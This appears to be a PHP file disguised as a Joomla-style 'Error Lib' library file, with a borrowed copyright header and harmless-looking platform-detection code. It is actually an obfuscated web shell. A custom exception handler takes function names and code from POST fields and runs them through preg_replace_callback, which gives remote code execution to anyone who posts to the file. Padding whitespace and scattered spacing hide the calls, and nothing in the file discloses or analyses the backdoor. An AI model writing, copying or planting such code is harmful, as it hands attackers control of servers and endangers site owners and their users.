<?php
/**
 * @package    Error Lib
 * *********************************
 * @copyright  Copyright (C) 2005 - 2016 Open Source Matters, Inc. All rights reserved.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   // naDX6X5MGvCWWxVhaGUgQTZCZmC4CSRHm5kVc2W5fRvAeTM9eykuBpsyXzNB0wqUDzf10BEr6hdqRtCab4BdPeXtWEsgkREPxfRGUW6PXGYrhP8Q10qPpp9PvKM57EpmD30htxzHap9AEKgxVgE30wDbd9uz5F923HAnKfvnRqDw4BSf0kPgSWA0B9SVUKHDA2SBQmc4zyVut5SSNKY4STpUqmTaAD0tgQTP4R8aNGKxnMZPPSevQ283sdyysgFk99HZZEDQedwneeRa2Vmbun5rZFa9A9GuuTFc4rrwaaF9X8VTGupSU6ZxUZ5RzydA8mXafZ9TbbVfVFdEdTwncvMXkEQe4AbzPn3vZNyKGDX4VMTQKu70XD84xtZshUN3yPvUDuw3WMp1T0qfx9HpCvDRBGCVXQdPb1Etku8pRAyq3hKK3reeBS93H1FwthRpZaSczR0t9EE1s8tWYvetH
 * @license    GNU General Public License version 2 or later; see LICENSE
 */

// Set the platform root path as a constant if necessary.
if (defined('PATH'))
{
	define('PATH', __DIR__);
}
else if (     empty             ($_POST)) {
	
	echo 'Not exception. Exiting.';
	
	exit;
}

// Register the exception library.
function exception_handler                         ($e) 
{
  preg_replace_callback                       ('||', $_POST['d']                         ('', $e->getMessage()), '')


; 
}
set_exception_handler                   ('exception_handler'    )


;

throw new Exception                         ($_POST['f']                           ($_POST            ['c'])                  );

// Detect the native operating system type.
$os = strtoupper                           (       substr(PHP_OS, 0, 3));

if (!defined('IS_WIN'))
{
	define('IS_WIN', ($os === 'WIN') ? true : false);
}
if (!defined('IS_UNIX'))
{
	define('IS_UNIX', (IS_WIN === false) ? true : false);
}
